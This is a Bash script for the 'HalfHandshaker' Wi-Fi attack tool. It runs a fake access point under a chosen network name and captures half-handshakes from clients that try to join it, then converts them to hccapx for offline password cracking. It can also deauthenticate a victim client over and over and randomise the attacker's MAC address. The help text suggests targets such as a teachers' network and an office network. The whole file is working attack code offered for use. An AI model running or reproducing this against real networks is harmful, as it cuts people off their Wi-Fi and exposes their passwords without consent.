#!/bin/bash

#
# HalfHandshaker
#
# By: Miguelillo
# Started: 26/06/20 
#
# For GitHub and for the SeguridadWireless forum community!
#
# Special thanks for fromCharCode!!
#


# Nombre predeterminado del archivo
date=$(date +%d-%m-%y_%H-%M)
output_name="captura_$date"

# Detectar idioma
function lang(){
    
    if [ "$(echo "$LANG" | head -c 2)" == "es" ]; then

        ### SPANISH ###

        # HELP

        help="""$(tput setaf 2)  _        _ $(tput sgr0) _              _ 
$(tput setaf 2) | |      | |$(tput sgr0)| |            | |
$(tput setaf 2) | |______| |$(tput sgr0)| |____________| |         Beta 0.5
$(tput setaf 2) |  ______  |$(tput sgr0)|  ____________  | By Miguelillo & fromCharCode
$(tput setaf 2) | | Half | |$(tput sgr0)| | Handshaker | |        28/06/2020
$(tput setaf 2) |_|      |_|$(tput sgr0)|_|            |_|
 
 
 Opciones:
 
 $(tput setaf 2)-h, --help$(tput sgr0)            Muestra esta ayuda
 $(tput setaf 2)-v, --version$(tput sgr0)         Muestra la version del script


 $(tput setaf 2)-s, --scan$(tput sgr0)         Escanea en busca de wifi probes
 
 $(tput setaf 2)-m, --mode   $(tput setaf 3)<modo>$(tput sgr0)        Selecciona el modo a utilizar
 
   $(tput setaf 5)Modo $(tput setaf 2)1 $(tput setaf 5)->$(tput sgr0)   Se usan dos tarjetas de red, una para escanear con airodump,
         que se elige con \"-i\" seguido del nombre de la interfaz y otra que se
                  usa para el AP falso, que se selecciona con \"-i2\"
 
   $(tput setaf 5)Modo $(tput setaf 2)2 $(tput setaf 5)->$(tput sgr0)  Utiliza una única interfaz que precisa de modo monitor.
           Escanea el tráfico con tcpdump y la interfaz se selecciona con \"-i\"
 
 
 $(tput setaf 2)-i, --interface            $(tput setaf 3)<interfaz>$(tput sgr0)   Especifica la interfaz a usar
 $(tput setaf 2)-i2, --hotspot-interface   $(tput setaf 3)<interfaz>$(tput sgr0)   Especifica la intrerfaz a usar para el AP (modo 1)
 
 
 $(tput setaf 2)-e, --essid    $(tput setaf 3)<nombre>$(tput sgr0)         Especifica el nombre del AP falso
 $(tput setaf 2)-o, --output   $(tput setaf 3)<nombre>$(tput sgr0)         Elige el nombre del archivo .cap y hccapx
 
 $(tput setaf 2)--hccapx$(tput sgr0)               Convierte el handshake en formato .cap a hccapx
 $(tput setaf 2)-r, --random-mac$(tput sgr0)       Cambia la mac de la tarjeta de red por una al azar
 
 
 Opciones de desautentificación, solo para modo 1:
 
  $(tput setaf 2)-d, --deauth$(tput sgr0)                     Desautentica al cliente de otra red
 $(tput setaf 2)--d-hotspot-mac   $(tput setaf 3)<mac hotspot>$(tput sgr0)   Especifica la mac del hotspot a atacar
 $(tput setaf 2)--d-client-mac    $(tput setaf 3)<mac cliente>$(tput sgr0)   Especifica la mac del cliente a desauteticar
 
 
 Ejemplos:

 ./halfhandshaker.sh -s -i wlan1

 ./halfhandshaker.sh -m 1 -i wlan1 -i2 wlan0 -e \"Bar-Juanito\" --hccapx -o \"red-bar\"
 
 ./halfhandshaker.sh -m 2 -i wlan1 -e \"Oficinas-12\" --hccapx -r
 
 ./halfhandshaker.sh -m 1 -i wlan2 -i2 wlan1 -e \"Red-profesores\" --hccapx -d --d-hotspot-mac XX:XX:XX:XX:XX:XX --d-client-mac YY:YY:YY:YY:YY:YY -r -o \"wifi-profes\"
    """


        # ROOT REQUIRED
        root_required=" Es necesario ejecutar el script con permisos de administrador"

        # ITS NECESARY HAVE INSTALLED
        itsnecesary=" Se requiere tener instalado el siguiente comando/paquete:"


        # TWO DIFFERENTS
        two_differents=" Debe usar dos interfaces de red distintas"

        # VALID INTERFACE
        valid_interface=" Se necesita una interfaz de red válida"

        # VALID INTERFACE HOTSPOT
        valid_interface_hotspot=" Se necesita una interfaz de red para el hotspot válida"

        # VALID ESSID
        valid_essid=" Se requiere de un essid válido"


        # MODE MONITOR
        modemonitor="[$(tput setaf 2)+$(tput sgr0)] Poniendo la interfaz en modo monitor..."

        # MODE MONITOR ERROR
        modemonitor_error=" Error al tratar de poner la interfaz $interface en modo monitor"

        # QUIT MONITOR
        quit_monitorr="[$(tput setaf 6)+$(tput sgr0)] Quitando la interfaz de modo monitor..."

        # ERROR QUIT MONITOR
        error_quit_monitor_mode=" Error al tratar de quitar la interfaz $interface de modo monitor"


        # CHANGING MAC
        changing_mac="[$(tput setaf 2)+$(tput sgr0)] Cambiando una mac address..."

        # CHANGING MAC ERROR
        changing_mac_error=" Error al tratar de cambiar la dirección mac de $hotspot_interface"

        # ORIGINAL MAC
        original_mac="[$(tput setaf 6)+$(tput sgr0)] Poniendo la mac address original..."


        # STARTING AIRODUMP
        starting_airodump="[$(tput setaf 2)+$(tput sgr0)] Iniciando airodump..."


        # PUSH CTRL C
        push_crtl_c=" Pulsa CTRL + C para terminar"


        # STARTING HOSTAPD
        startign_hostapd="[$(tput setaf 2)+$(tput sgr0)] Iniciando hostapd..."


        # STARTING TCPDUMP
        starting_tcpdump="[$(tput setaf 2)+$(tput sgr0)] Iniciando tcpdump..."


        # CONVERTING HCCAPX
        converting_hccapx="[$(tput setaf 2)+$(tput sgr0)] Convirtiendo handshake a hccapx..."

        # ERROR HCCAPX
        error_hccapx="[$(tput setaf 1)+$(tput sgr0)] Ha ocurrido un error al pasarlo a hccapx"

        # CAP ROUTE
        cap_route="[$(tput setaf 3)+$(tput sgr0)] El archivo .cap se ecuentra en $(pwd)/$output_name.cap"

        # CONVERTED
        converted="[$(tput setaf 2)+$(tput sgr0)] Convertido a hccapx"

        # HCCAPX ROUTE
        hccapx_route="[$(tput setaf 2)+$(tput sgr0)] El archivo .hccapx se ecuentra en $(pwd)/$output_name.hccapx"

        # NO HANDHSAKE
        no_handshake="[$(tput setaf 3)+$(tput sgr0)] No se han encontrado ningún hanshake"

        # INVALID ARGUMENT
        invalid_argument=" Argumento no válido:"


        # ALREADY EXISTS
        already_exists="[$(tput setaf 3)!$(tput sgr0)] Ya existe un archivo de nombre $output_name.cap"

        # SURE ¿?
        sure=" ¿Seguro que quieres continuar? [y/n] -> "


        # EXITTING
        exitting="[$(tput setaf 3)+$(tput sgr0)] Saliendo..."


        # INVALID OPTION
        invalid_option="  /$(tput setaf 3)!$(tput sgr0)\ Opción no válida"


        # VALID MODE
        valid_mode=" Se necesita especificar un modo válido (1 o 2)"


        # DEAUTH MODE 2
        deauth_mode2=" /!\ Las opciones de desautentificación solo son compatibles con el modo 1 /!\ "

        # DEAUTH MAC ERROR
        deauth_mac_error=" Debe introducir una mac address válida con --d-hotspot-mac y --d-client-mac"

        # STARTING AIREPLAY FOR DEAUTH
        startign_aireplay="[$(tput setaf 2)+$(tput sgr0)] Iniciando aireplay-ng para la desautentificación..."


        # TO STOP
        tostop="para detenerlo"

    else

        ### ENGLISH ###

        # HELP

        help="""$(tput setaf 2)  _        _ $(tput sgr0) _              _ 
$(tput setaf 2) | |      | |$(tput sgr0)| |            | |
$(tput setaf 2) | |______| |$(tput sgr0)| |____________| |         Beta 0.5
$(tput setaf 2) |  ______  |$(tput sgr0)|  ____________  | By Miguelillo & fromCharCode
$(tput setaf 2) | | Half | |$(tput sgr0)| | Handshaker | |        28/06/2020
$(tput setaf 2) |_|      |_|$(tput sgr0)|_|            |_|
 
 
 Options:
 
 $(tput setaf 2)-h, --help$(tput sgr0)            Show help
 $(tput setaf 2)-v, --version$(tput sgr0)         Show script version
 

 $(tput setaf 2)-s, --scan$(tput sgr0)         Scan for wifi probes
 
 $(tput setaf 2)-m, --mode   $(tput setaf 3)<mode>$(tput sgr0)        Set a mode to use
 
   $(tput setaf 5)Mode nº $(tput setaf 2)1 $(tput setaf 5)->$(tput sgr0)   Two interfaces are used, one for a airodump's scan,
         which is set with the \"-i\" option followed by the interface's name and other
                  that is used for the fake AP, and it's set with \"-i2\"
 
   $(tput setaf 5)Mode nº $(tput setaf 2)2 $(tput setaf 5)->$(tput sgr0)  Uses a only network interface which requires monitor mode.
                  Scans the traffic with tcpdump and it is set using \"-i\"
 
 
 $(tput setaf 2)-i, --interface            $(tput setaf 3)<interface>$(tput sgr0)   Set the network interface
 $(tput setaf 2)-i2, --hotspot-interface   $(tput setaf 3)<interface>$(tput sgr0)   Set the interface for the AP (mode nº1)
 
 
 $(tput setaf 2)-e, --essid    $(tput setaf 3)<name>$(tput sgr0)         Set the fake AP's name
 $(tput setaf 2)-o, --output   $(tput setaf 3)<name>$(tput sgr0)         Set the name of the cap and hccapx files
 
 $(tput setaf 2)--hccapx$(tput sgr0)               Converts the handshake to hccapx
 $(tput setaf 2)-r, --random-mac$(tput sgr0)       Change the mac address of the interface by a random one
 
 
 Deauth options, only for mode nº1:
 
  $(tput setaf 2)-d, --deauth$(tput sgr0)                     Set the deauth option enable
 $(tput setaf 2)--d-hotspot-mac   $(tput setaf 3)<hotspot mac>$(tput sgr0)   Set the hotspot to attack
 $(tput setaf 2)--d-client-mac    $(tput setaf 3)<client mac>$(tput sgr0)    Set the mac of the victim client
 
 
 Examples:
 
 ./halfhandshaker.sh -s -i wlan1

 ./halfhandshaker.sh -m 1 -i wlan1 -i2 wlan0 -e \"John-Pub\" --hccapx -o \"pub-net\"
 
 ./halfhandshaker.sh -m 2 -i wlan1 -e \"Office-12\" --hccapx -r
 
 ./halfhandshaker.sh -m 1 -i wlan2 -i wlan 1 -e \"Teachers-net\" --hccapx -d --d-hotspot-mac XX:XX:XX:XX:XX:XX --d-client-mac YY:YY:YY:YY:YY:YY -r -o \"teachers-wifi\"
    """


        # ROOT REQUIRED
        root_required=" Root privileges are required to run the script"

        # ITS NECESARY HAVE INSTALLED
        itsnecesary=" It's necessary to have installed this command/packet:"


        # TWO DIFFERENTS
        two_differents=" You must use two different interfaces"

        # VALID INTERFACE
        valid_interface=" A valid network interface is required"

        # VALID INTERFACE HOTSPOT
        valid_interface_hotspot=" Hotspot requires a valid interface"

        # VALID ESSID
        valid_essid=" Valid ESSID needed"


        # MODE MONITOR
        modemonitor="[$(tput setaf 2)+$(tput sgr0)] Setting interface into monitor mode"

        # MODE MONITOR ERROR
        modemonitor_error=" Error while trying to set $interface into monitor mode"

        # QUIT MONITOR
        quit_monitorr="[$(tput setaf 6)+$(tput sgr0)] Quitting monitor mode..."

        # ERROR QUIT MONITOR
        error_quit_monitor_mode=" Error while trying to quit $interface from monitor mode"


        # CHANGING MAC
        changing_mac="[$(tput setaf 2)+$(tput sgr0)] Changing mac address..."

        # CHANGING MAC ERROR
        changing_mac_error=" Error while trying to change mac address from $hotspot_interface"

        # ORIGINAL MAC
        original_mac="[$(tput setaf 6)+$(tput sgr0)] Setting original mac address..."


        # STARTING AIRODUMP
        starting_airodump="[$(tput setaf 2)+$(tput sgr0)] Starting airodump..."


        # PUSH CTRL C
        push_crtl_c=" Push CTRL + C to stop"


        # STARTING HOSTAPD
        startign_hostapd="[$(tput setaf 2)+$(tput sgr0)] Starting hostapd..."


        # STARTING TCPDUMP
        starting_tcpdump="[$(tput setaf 2)+$(tput sgr0)] Starting tcpdump..."


        # CONVERTING HCCAPX
        converting_hccapx="[$(tput setaf 2)+$(tput sgr0)] Conversing hanshake to hccapx..."

        # ERROR HCCAPX
        error_hccapx="[$(tput setaf 1)+$(tput sgr0)] Error while trying to change the hanshake to hccapx"

        # CAP ROUTE
        cap_route="[$(tput setaf 3)+$(tput sgr0)] Cap file located in $(pwd)/$output_name.cap"

        # CONVERTED
        converted="[$(tput setaf 2)+$(tput sgr0)] Converted to hccapx"

        # HCCAPX ROUTE
        hccapx_route="[$(tput setaf 2)+$(tput sgr0)] Hccapx file located in $(pwd)/$output_name.hccapx"

        # NO HANDHSAKE
        no_handshake="[$(tput setaf 3)+$(tput sgr0)] No handshakes found"


        # INVALID ARGUMENT
        invalid_argument=" Invalid argument:"


        # ALREADY EXISTS
        already_exists="[$(tput setaf 3)!$(tput sgr0)] A file called $output_name.cap already exists"

        # SURE ¿?
        sure=" ¿Do you want to continue? [y/n] -> "


        # EXITTING
        exitting="[$(tput setaf 3)+$(tput sgr0)] Exitting..."


        # INVALID OPTION
        invalid_option="  /$(tput setaf 3)!$(tput sgr0)\ Invalid option"


        # VALID MODE
        valid_mode=" It's necessary to set a valid mode (1 or 2)"


        # DEAUTH MODE 2
        deauth_mode2=" /!\ Deauth options are only compatible with mode nº 1 /!\ "

        # DEAUTH MAC ERROR
        deauth_mac_error=" Setting a valid mac address with --d-hotspot-mac and --d-client-mac is required"

        # STARTING AIREPLAY FOR DEAUTH
        startign_aireplay="[$(tput setaf 2)+$(tput sgr0)] Stairting aireplay-ng for deauth..."


        # TO STOP
        tostop="to stop it"

    fi

}

# Ayuda del programa
function show_help(){

    lang
    echo "$help"
    
    exit 0

}

# Comprueba si tiene permisos de administrador y si todas las herramientas necesarias están instaladas
function check(){

    # Comprueba si tiene permisos de adminsitrador
    if [[ $EUID -ne 0 ]]; then
       echo "$root_required" 
       exit 0
    fi

    no_tool=0
    # Comprobando las herramientas
    if [ -z "$(command -v airodump-ng)" ]; then 
        echo "$itsnecesary aircrack-ng"
        no_tool=1        
    fi

    if [ -z "$(command -v tcpdump)" ]; then 
        echo "$itsnecesary tcpdump"
        no_tool=1
    fi

    if [ -z "$(command -v hostapd)" ]; then 
        echo "$itsnecesary hostapd"
        no_tool=1
    fi

    if [ -z "$(command -v ifconfig)" ]; then 
        echo "$itsnecesary ifconfig from net-tools"
        no_tool=1
    fi

    if [ -z "$(command -v iwconfig)" ]; then 
        echo "$itsnecesary iwconfig from net-tools"
        no_tool=1
    fi

    if [ -z "$(command -v ip)" ]; then 
        echo "$itsnecesary ip command"
        no_tool=1
    fi

    if [ -z "$(command -v macchanger)" ]; then 
        echo "$itsnecesary macchanger"
        no_tool=1
    fi

    if [ -z "$(command -v xterm)" ]; then 
        echo "$itsnecesary xterm"
        no_tool=1
    fi


    if [ "$no_tool" == "1" ]; then

        exit 0

    fi

}

# Comprobando si la interfaz de red es correcta
function  check_interface(){

    if [ -z "$interface" ]; then

        error=1

    else

        if [ -z "$(ip link | grep $interface)" ]; then

            error=1

        fi

    fi


    if [ "$error" == "1" ]; then

        if [ ! -z "$(ip link | grep "$interface"mon)" ]; then

            airmon-ng stop "$interface"mon

        else

        echo "$valid_interface"
        exit 0

        fi
    fi


    if [ "$interface" == "$hotspot_interface" ]; then
        echo "$two_differents"
        echo

        exit 0

    fi


}

# Comprobando si la interfaz de red es correcta
function  check_hotspot_interface(){

    if [ -z "$hotspot_interface" ]; then

        error=1

    else

        if [ -z "$(ip link | grep $hotspot_interface)" ]; then

            error=1

        fi

    fi

if [ "$error" == "1" ]; then

    echo "$valid_interface_hotspot"
    exit 0

fi

}

# Comprobando que se ha introducido el valor essid
function check_essid(){

    if [ -z "$essid" ]; then

        echo "$valid_essid"
        exit 0

    fi

}

# Poniendo la interfaz en modo monitor
function monitor_mode(){

    check_interface
    echo "$modemonitor"
    tput setaf 1
    
    ifconfig $interface down || error_monitor_mode
    iwconfig $interface mode monitor || error_monitor_mode2
    ifconfig $interface up || error_monitor_mode

    tput sgr0

}

function error_monitor_mode(){
    tput sgr0
    echo "$modemonitor_error"
    exit 0
} 

function error_monitor_mode2(){
    tput sgr0
    echo "$modemonitor_error"
    ifconfig $interface up
    exit 0
}

function quit_monitor_mode(){

    check_interface
    echo "$quit_monitorr"
    tput setaf 1
    
    ifconfig $interface down || error_quit_monitor_mode
    iwconfig $interface mode managed || error_quit_monitor_mode
    ifconfig $interface up || error_quit_monitor_mode

    tput sgr0

}

function error_quit_monitor_mode(){
    tput sgr0
    echo "$erorr_quit_modemonitor"
    exit 0
} 

# Cambiar la MAC address a una random
function random_mac(){

    if [ "$random_mac" == "1" ];then

        echo "$changing_mac"
        tput setaf 1

        sleep 1
        ifconfig $hotspot_interface down || error_mac
        macchanger -r $hotspot_interface > /dev/null || error_mac2
        ifconfig $hotspot_interface up || error_mac
 
        tput sgr0

    fi

}

function error_mac(){
    tput sgr0
    echo "$changing_mac_error"

} 

function error_mac2(){
    tput sgr0
    echo "$changing_mac_error"
    ifconfig $hotspot_interface up

}

function return_mac(){

    if [ "$random_mac" == "1" ];then

        echo "$original_mac"
        tput setaf 1

        sleep 1
        ifconfig $hotspot_interface down || error_mac
        macchanger -p $hotspot_interface > /dev/null || error_mac2
        ifconfig $hotspot_interface up || error_mac
 
        tput sgr0

    fi

}

# Función de salir
function salir(){

    echo

    if [ "$mode" == "1" ]; then

        quit_monitor_mode
        return_mac
        rm hostapd.conf
        echo

    elif [ "$mode" == "2" ]; then

        return_mac
        delete_mon0
        rm hostapd.conf
        echo

    fi



}

#function aviso(){

#    if [ -f *.cap ]; then

#        echo "[$(tput setaf 3)!$(tput sgr0)] Parece que tienes alguna captura en $(pwd), no dejes que se acumulen muchas o te liarás!"
#        echo

#    fi       

#}


# Modo de ataque 1
function modo1(){

#    aviso
    check_interface
    check_essid
    check_deauth
    
    monitor_mode
    random_mac


    hostapd &

    sleep 5

    echo "$starting_airodump"

    deauth &

    sleep 3

    echo
    echo "$push_crtl_c"

    xterm  -T "Airodump-ng" -e "airodump-ng --essid $essid -c 1 $interface -w $output_name --output-format pcap"
    
    stopdeauth="1"
    xterm -e "killall hostapd"

    convert

    salir
}

# Comprobar los parámetros pasados al deauth
function check_deauth(){

    if [ "$deauth" == "1" ]; then

        if [ -z "$d_h_mac" ] || [ -z "$d_c_mac" ]; then

            echo "$deauth_mac_error"
            echo 
            echo 0


        elif [ "$(echo $d_h_mac | wc -c)" != "18" ] || [ "$(echo $d_c_mac | wc -c)" != "18" ]; then

            echo "$deauth_mac_error"
            exit 0

        fi

    fi
}

# Desatentificacion con aireplay
function deauth(){

    if [ "$deauth" == "1" ]; then

        echo "$startign_aireplay"

        while [ "$stopdeauth" != "1" ]; do

            xterm -T "Aireplay deauth" -e "tput setaf 1 && aireplay-ng -0 3 -a $d_h_mac -c $d_c_mac $interface"
            sleep 5

        done

    fi
}

function hostapd(){

    echo "$startign_hostapd"

    check_essid
    check_hotspot_interface

#    airmon-ng check kill > /dev/null    
    
    echo """interface=$hotspot_interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP""">hostapd.conf


    xterm  -T "Hostapd" -e "tput setaf 6 && hostapd hostapd.conf"
}


# Modo de ataque 2
function modo2(){

#    aviso
    check_interface

    hotspot_interface=$interface

    random_mac
    check_essid

    hostapd &

    sleep 5

    echo "$starting_tcpdump"

    echo
    echo "$push_crtl_c"


    xterm  -T "tcpdump" -e "tput setaf 2 && tcpdump -i $interface --monitor-mode -w $output_name.cap"


    xterm -e "killall hostapd"

    convert

    salir
}

function scan_probes(){

    check_interface

    tput setaf 0
    tcpdump -l -I -i $interface -e -s 256 type mgt subtype probe-req -v | sed -e 's/.* -/-/' -e 's/signal .* SA:/ /' -e 's/ (.*Probe Request (/  /' -e 's/).*//' &

    sleep 1
    echo
    tput sgr0
    echo "      ENTER $tostop"
    echo
    echo "$(tput setaf 3) POWER         MAC             ESSID$(tput sgr0)"

    read

    tput setaf 0
    sleep 1

    xterm -e "killall tcpdump"

    delete_mon0

    sleep 1
    tput sgr0

    exit 0

}

# Borrar interfaz mon0
function delete_mon0(){

    if [ ! -z "$(ifconfig | grep mon0)" ]; then

        airmon-ng stop mon0 > /dev/null

    fi

}


function convert(){

    sleep 5

    if [ "$hccapx" == "1" ]; then

        echo
        echo "$converting_hccapx"
        echo

        cap2hccapx="$(./modules/cap2hccapx $output_name* $output_name.hccapx | grep Written | head --bytes 9 | tail --bytes 1)" 

        if [ ! -z "$cap2hccapx" ]; then

            if [ "$cap2hccapx" -gt "0" ]; then

                if [ ! -f "$output_name.hccapx" ]; then

                    echo "$error_hccapx"
                    echo "$cap_route"


                else

                    echo "$converted"
                    echo "$hccapx_route"

                fi

            elif [ "$cap2hccapx" -eq "0" ]; then

                echo "$no_handshake"
                rm $output_name".hccapx"
                echo "$cap_route"
                

            else

                echo "$error_hccapx"
                echo "$cap_route"
            
            fi
            
        else

                echo "$error_hccapx"
                echo "$cap_route"

        fi
    fi

}


# Comprobando si está vacio
if [ $# == "0" ]; then

    show_help

fi

# Parámetros
while [ $# -ne 0 ]; do

    case "$1" in

        -h|--help)
            show_help
            ;;
        -v|--version)
            echo "Version: Beta 0.5"
            exit 0
            ;;
        -m|--mode)
            mode="$2"
            shift            
            ;;
        -i|--interface)
            interface="$2"
            shift
            ;;
        -i2|--hotspot-interface)
            hotspot_interface="$2"
            shift
            ;;
        -e|--essid)
            essid="$2"
            shift
            ;;
        -o|--output)
            output_name="$2"
            shift
            ;;
        --hccapx)
            hccapx=1            
            ;;
        -s|--scan)
            scan=1            
            ;;
        -r|--random-mac)
            random_mac=1
            ;;
        -d|--deauth)
            deauth=1 
            ;;
        --d-hotspot-mac)
            d_h_mac="$2"
            shift 
            ;;
        --d-client-mac)
            d_c_mac="$2"
            shift 
            ;;
        *)  
            echo
            echo "Invalid argument: $1"
            show_help
            ;;

    esac

    shift

done

lang
check

ok=false

if [ -f "$output_name.cap" ]; then

    while [ "$ok" == "false" ]; do

        echo
        echo "$already_exists"
        printf "$sure"
        read yn

        if [ "$yn" == "y" ] || [ "$yn" == "Y" ] || [ "$yn" == "yes" ] || [ "$yn" == "YES" ]; then

            echo
            ok=true

        elif [ "$yn" == "n" ] || [ "$yn" == "N" ] || [ "$yn" == "no" ] || [ "$yn" == "NO" ]; then

            echo
            echo "$exitting"
            echo

            exit 0

        else 

            echo
            echo "$invalid_option"
            echo

        fi

    done

fi


if [ "$scan" == "1" ]; then

    scan_probes

else
    if [ "$mode" == "1" ]; then

        echo
        modo1

    elif [ "$mode" == "2" ]; then

        if [ "$deauth" == "1" ]; then

            echo
            echo "$deauth_mode2"
            echo
            exit 0
        fi

        echo
        modo2

    else

        echo
        echo "$valid_mode"
        echo
        show_help

    fi
fi